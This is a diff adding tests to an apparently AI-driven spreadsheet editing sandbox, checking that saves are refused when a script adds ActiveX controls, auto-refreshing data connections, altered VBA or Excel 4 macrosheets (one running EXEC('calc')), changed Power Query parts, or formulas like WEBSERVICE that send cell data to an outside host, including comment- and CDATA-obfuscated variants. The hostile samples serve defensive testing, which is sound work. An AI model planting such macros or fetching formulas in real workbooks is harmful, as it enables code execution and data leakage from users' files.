@@ -518,6 +518,163 @@ saveFile('${input}', fflate.zipSync(parts))
     }
   })
 
+  it('refuses a macro, ActiveX control or data connection the script added, whatever its content type says', async () => {
+    storeAttachment('chart.xlsx', await fixture('WithChart.xlsx'))
+    storeAttachment('SimpleMacro.xlsm', await fixture('SimpleMacro.xlsm'))
+    const relationshipTypes = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
+    const edit = (input: string, change: string) => `
+const parts = fflate.unzipSync(readFile('${input}'))
+const text = (name) => parts[name] ? fflate.strFromU8(parts[name]) : '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>'
+const relate = (part, type, target) => {
+  parts[part] = fflate.strToU8(text(part).replace('</Relationships>', '<Relationship Id="rId90" Type="' + type + '" Target="' + target + '"/></Relationships>'))
+}
+${change}
+saveFile('${input}', fflate.zipSync(parts))
+`
+    const cases = [
+      [
+        'chart.xlsx',
+        `relate('xl/worksheets/_rels/sheet1.xml.rels', '${relationshipTypes}/control', '../activeX/activeX1.xml')
+parts['xl/activeX/activeX1.xml'] = fflate.strToU8('<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" ax:classid="{8BD21D40-EC42-11CE-9E0D-00AA006002F3}" ax:persistence="persistPropertyBag"/>')`,
+        'added an ActiveX control, which Office can load and run when the file opens, in xl/activeX/activeX1.xml,',
+      ],
+      [
+        'chart.xlsx',
+        `relate('xl/_rels/workbook.xml.rels', '${relationshipTypes}/connections', 'connections.xml')
+parts['xl/connections.xml'] = fflate.strToU8('<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><connection id="1" name="q" type="4" refreshOnLoad="1"><webPr url="https://example.com/q"/></connection></connections>')`,
+        'added a data connection, which Excel can refresh from outside the file, in xl/connections.xml,',
+      ],
+      [
+        'SimpleMacro.xlsm',
+        `parts['xl/vbaProject.bin'] = new Uint8Array([...parts['xl/vbaProject.bin'], 0])
+parts['[Content_Types].xml'] = fflate.strToU8(text('[Content_Types].xml').replace('application/vnd.ms-office.vbaProject', 'application/octet-stream'))`,
+        'added or changed the macros in xl/vbaProject.bin.',
+      ],
+      [
+        'chart.xlsx',
+        `relate('xl/_rels/workbook.xml.rels', 'http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet', 'macrosheets/m1.xml')
+parts['xl/macrosheets/m1.xml'] = fflate.strToU8('<xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main" xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1"><f>EXEC("calc")</f></c></row></sheetData></xm:macrosheet>')
+parts['[Content_Types].xml'] = fflate.strToU8(text('[Content_Types].xml').replace('</Types>', '<Override PartName="/xl/macrosheets/m1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>'))`,
+        'added or changed the macros in xl/macrosheets/m1.xml.',
+      ],
+    ]
+    for (const [input, change, refusal] of cases) {
+      expect(await errorOf(edit(input, change), [input])).toStartWith(`"${input}" was not saved: the script ${refusal}`)
+    }
+  })
+
+  it('refuses a changed Power Query part, but keeps the one the workbook had', async () => {
+    const parts = unzipSync(await fixture('WithChart.xlsx'))
+    parts['customXml/item1.xml'] = strToU8(
+      '<?xml version="1.0" encoding="UTF-8"?><DataMashup xmlns="http://schemas.microsoft.com/DataMashup">AAAAAA==</DataMashup>',
+    )
+    storeAttachment('query.xlsx', zipSync(parts))
+    const kept = `
+const f = excelize.OpenReader(readFile('query.xlsx'))
+f.SetCellValue(f.GetSheetList().list[0], 'Z1', 'reviewed')
+saveFile('query.xlsx', f.WriteToBuffer().buffer)
+`
+    const { file } = await runOk(kept, ['query.xlsx'])
+    expect((await partsOf(file))['customXml/item1.xml']).toEqual(parts['customXml/item1.xml'])
+    const changed = `
+const parts = fflate.unzipSync(readFile('query.xlsx'))
+parts['customXml/item1.xml'] = fflate.strToU8(fflate.strFromU8(parts['customXml/item1.xml']).replace('AAAAAA==', 'AAAAAB=='))
+saveFile('query.xlsx', fflate.zipSync(parts))
+`
+    expect(await errorOf(changed, ['query.xlsx'])).toStartWith(
+      '"query.xlsx" was not saved: customXml/item1.xml is a Power Query (DataMashup) part, which Excel runs when its data connection refreshes, and no file the script read had that part and its relationships byte for byte.',
+    )
+  })
+
+  it('refuses a formula the script added that fetches data from outside the file, but keeps one the workbook had', async () => {
+    const refusal = (name: string, part = 'xl/worksheets/sheet1.xml') =>
+      `"${name}" was not saved: the script added a formula that fetches data from outside the file (WEBSERVICE, IMAGE, RTD or an IMPORT function), which Excel or Google Sheets runs when the workbook calculates, in ${part} (`
+    for (const formula of [
+      'WEBSERVICE("https://example.com/?q="&B1)',
+      'IMAGE("https://example.com/a.png")',
+      'RTD("a.b","host","t")',
+      'IMPORTDATA("https://example.com/a.csv")',
+    ]) {
+      const script = `const f = excelize.NewFile(); f.SetCellFormula('Sheet1', 'A1', ${JSON.stringify(formula)}); saveFile('a.xlsx', f.WriteToBuffer().buffer)`
+      expect(await errorOf(script)).toStartWith(refusal('a.xlsx'))
+    }
+    const named = `const f = excelize.NewFile(); f.SetDefinedName({ Name: 'feed', RefersTo: '_xlfn.WEBSERVICE("https://example.com")' }); saveFile('a.xlsx', f.WriteToBuffer().buffer)`
+    expect(await errorOf(named)).toStartWith(refusal('a.xlsx', 'xl/workbook.xml'))
+    const conditional = `
+const f = excelize.NewFile()
+const style = f.NewConditionalStyle({ Font: { Color: '#9A0511' } }).style
+f.SetConditionalFormat('Sheet1', 'A1:A5', [{ Type: 'formula', Criteria: 'LEN(_xlfn.WEBSERVICE("https://example.com"))>0', Format: style }])
+saveFile('a.xlsx', f.WriteToBuffer().buffer)
+`
+    expect(await errorOf(conditional)).toStartWith(refusal('a.xlsx'))
+    const scale = `
+const f = excelize.NewFile()
+f.SetConditionalFormat('Sheet1', 'A1:A5', [{ Type: '2_color_scale', Criteria: '=', MinType: 'formula', MinValue: 'WEBSERVICE("https://example.com")', MaxType: 'max', MinColor: '#F8696B', MaxColor: '#63BE7B' }])
+saveFile('a.xlsx', f.WriteToBuffer().buffer)
+`
+    expect(await errorOf(scale)).toStartWith(refusal('a.xlsx'))
+    // Built by hand, so the check sees the XML exactly as written. A UTF-8 byte-order mark is valid XML too.
+    for (const [cell, mark] of [
+      ['<f>WEB<!-- -->SERVICE("https://example.com")</f>', ''],
+      ['<f><![CDATA[_xlfn.IMAGE("https://example.com/a.png")]]></f>', ''],
+      ['<f>_xlfn.WEBSERVICE("https://example.com")</f>', '\\uFEFF'],
+    ]) {
+      const script = `
+const parts = fflate.unzipSync(excelize.NewFile().WriteToBuffer().buffer)
+const sheet = fflate.strFromU8(parts['xl/worksheets/sheet1.xml'])
+parts['xl/worksheets/sheet1.xml'] = fflate.strToU8('${mark}' + sheet.replace('<sheetData></sheetData>', '<sheetData><row r="1"><c r="A1">${cell}</c></row></sheetData>'))
+saveFile('a.xlsx', fflate.zipSync(parts))
+`
+      expect(await errorOf(script)).toStartWith(refusal('a.xlsx'))
+    }
+
+    const engines = await loadSpreadsheetEngines(
+      await packageFile('excelize-wasm/excelize.wasm.gz'),
+      await packageFile('@ironcalc/wasm/wasm_bg.wasm'),
+    )
+    const book = engines.excelize.NewFile()
+    book.SetCellFormula('Sheet1', 'A1', '_xlfn.WEBSERVICE("https://example.com/feed")')
+    const { buffer } = book.WriteToBuffer()
+    if (!(buffer instanceof Uint8Array)) {
+      throw new Error('WriteToBuffer returned no bytes')
+    }
+    storeAttachment('feed.xlsx', new Uint8Array(buffer))
+    const edit = (cell: string, formula: string) =>
+      `const f = excelize.OpenReader(readFile('feed.xlsx')); f.SetCellFormula('Sheet1', '${cell}', ${JSON.stringify(formula)}); saveFile('feed.xlsx', f.WriteToBuffer().buffer)`
+    expect((await runOk(edit('B1', 'SUM(1,2)'), ['feed.xlsx'])).output.ok).toBe(true)
+    // The refusal quotes the formula, so the model can tell the user's own formula it changed from one it added.
+    expect(await errorOf(edit('A1', 'WEBSERVICE("https://example.org/feed")'), ['feed.xlsx'])).toStartWith(
+      `${refusal('feed.xlsx')}${JSON.stringify('_xlfn.WEBSERVICE("https://example.org/feed")')}), and no file`,
+    )
+
+    const lookalikes = `
+const f = excelize.NewFile()
+f.SetCellFormula('Sheet1', 'A1', 'HYPERLINK("https://example.com","open")')
+f.SetCellFormula('Sheet1', 'A2', '"Image ("&B1&")"')
+f.SetCellFormula('Sheet1', 'A3', 'FILTERXML(B1,"//a")')
+f.SetCellFormula('Sheet1', 'A4', 'SUM(Table1[Image (URL)])')
+saveFile('a.xlsx', f.WriteToBuffer().buffer)
+`
+    expect((await runOk(lookalikes)).output.ok).toBe(true)
+  })
+
+  it('escapes the formulas of a data validation, which Excelize writes into the sheet as they are', async () => {
+    const { file } = await runOk(`
+const f = excelize.NewFile()
+f.AddDataValidation('Sheet1', { Sqref: 'C1', Type: 'custom', Formula1: '<injected attr="a&b"/>' })
+f.AddDataValidation('Sheet1', { Sqref: 'C2', Type: 'whole', Operator: 'between', Formula1: 'A1<5', Formula2: '10' })
+saveFile('valid.xlsx', f.WriteToBuffer().buffer)
+`)
+    const sheet = new DOMParser({ onError: onWarningStopParsing }).parseFromString(
+      textOf(await partsOf(file), 'xl/worksheets/sheet1.xml'),
+      'text/xml',
+    )
+    expect(Array.from(sheet.getElementsByTagName('formula1'), (node) => node.textContent)).toEqual([
+      '<injected attr="a&b"/>',
+      'A1<5',
+    ])
+  })
+
   it('refuses a workbook marked as having macros under a .xlsx name, without asking for .xlsm', async () => {
     storeAttachment('SimpleMacro.xlsm', await fixture('SimpleMacro.xlsm'))
     const error = await errorOf(`saveFile('copy.xlsx', readFile('SimpleMacro.xlsm'))`, ['SimpleMacro.xlsm'])
